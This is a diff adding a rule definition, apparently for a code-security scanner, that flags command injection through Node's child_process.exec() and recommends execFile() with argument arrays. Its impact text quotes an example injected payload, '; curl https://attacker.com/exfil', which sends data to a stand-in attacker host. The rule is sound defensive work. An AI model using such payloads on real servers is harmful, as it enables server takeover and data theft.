@@ -1,0 +1,30 @@
+id = "ts-cmdi-exec-direct"
+title = "Command injection via child_process.exec()"
+tier = 1
+cwe = "CWE-78"
+cvss_base = 9.8
+cvss_vector = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+owasp = "A03:2021"
+severity = "Critical"
+languages = ["typescript", "javascript"]
+frameworks = ["express", "fastify", "hono"]
+runtime_probe = "cmdi"
+is_security = true
+category = "injection"
+
+observation = """
+User-controlled input is passed to child_process.exec() via shell string
+interpolation or direct concatenation, allowing injection of shell metacharacters.
+"""
+
+impact = """
+An attacker can execute arbitrary OS commands by sending a crafted payload
+such as '; curl https://attacker.com/exfil'. This typically results in
+full server compromise.
+"""
+
+improvement = """
+Replace exec() with execFile() and pass user-controlled values as elements
+of the arguments array — never via string interpolation. Alternatively,
+validate input against a strict allowlist before constructing the command.
+"""
